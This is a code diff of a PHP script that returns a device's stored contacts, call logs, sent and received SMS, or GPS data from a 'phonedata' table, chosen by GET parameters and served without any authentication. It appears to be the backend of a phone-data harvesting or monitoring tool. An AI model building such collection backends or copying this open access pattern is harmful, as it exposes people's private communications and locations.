@@ -1,11 +1,11 @@
 <?php
- error_reporting(E_ALL);
+error_reporting(E_ALL);
 include 'medoo.php';
 
 
 // Using Medoo namespace
 use Medoo\Medoo;
- 
+
 $database = new Medoo([
 	// required
 	'database_type' => 'mysql',
@@ -52,23 +52,53 @@ $database = new Medoo([
 // ]);
 
 
-$id = $_GET['id'];
+$deviceid = $_GET['deviceid'];
 $col = $_GET['col'];
-if($col == 0){
-    $str = "tel";
-}else{
-    $str = "person";
+
+switch ($col) {
+	case 0:
+		$msg = "contact";
+		break;
+	case 1:
+		$msg = "calllogs";
+		break;
+	case 2:
+		$msg = "smsrecv";
+		break;
+	case 3:
+		$msg = "smssend";
+		break;
+	case 4:
+		$msg = "gps";
+		break;
+	default:
+		$msg = "unkown";
+		break;
+
 }
 
 
-$datas = $database->select("datainfo",
-["id",$str],
-["id"=> $id]
+
+$datas = $database->select(
+	"phonedata",
+	[$msg],
+	["deviceid" => $deviceid]
 );
 
-#var_dump($datas);
+//var_dump($datas[0]);
+$contactlist = $datas[0][$msg];
+//echo $contactlist;
+$start = strpos($contactlist, '[');
+$end = strpos($contactlist, ']');
+$len = $end - $start + 1;
+$infolist = substr($contactlist, $start, $len);
+echo $infolist;
+// $jsondata = json_encode($infolist);
 
-echo(json_encode($datas));
+// echo $jsondata;
+
+// echo json_decode($jsondata)['contactlist'];
+// echo gettype($jsondata);
 
 
 // foreach($datas as $data)
